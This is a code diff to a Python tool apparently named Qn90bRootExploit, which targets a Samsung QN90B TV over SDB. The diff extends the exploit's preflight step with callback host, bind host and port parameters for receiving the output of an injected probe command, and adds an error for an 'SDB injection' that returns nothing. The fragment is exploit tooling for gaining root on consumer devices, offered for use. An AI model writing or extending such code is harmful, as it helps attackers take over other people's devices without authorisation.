@@ -8,6 +8,7 @@ import asyncio
 import contextlib
 import secrets
 import tempfile
+from collections.abc import Callable
 from dataclasses import dataclass
 from pathlib import Path
 
@@ -84,12 +85,30 @@ class Qn90bRootExploit:
         self.payload_directory = payload_directory.resolve()
         self.sdb = SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
 
-    def preflight(self, *, require_tested: bool = False) -> TargetAssessment:
+    def preflight(
+        self,
+        *,
+        require_tested: bool = False,
+        callback_host: str | None = None,
+        bind_host: str | None = None,
+        port: int = 0,
+        on_listening: Callable[[str, str, int], None] | None = None,
+    ) -> TargetAssessment:
         self.sdb.connect()
+        self.sdb.require_device()
         result = self.sdb.capture(
             QN90B_PROFILE.probe_command(),
+            callback_host=callback_host,
+            bind_host=bind_host,
+            port=port,
             timeout=20.0,
+            on_listening=on_listening,
         )
+        if not result.output.strip():
+            raise Qn90bError(
+                "preflight callback connected but returned no output "
+                f"(SDB injection exit {result.transport_returncode})"
+            )
         assessment = QN90B_PROFILE.assess(result.output)
         try:
             if require_tested:
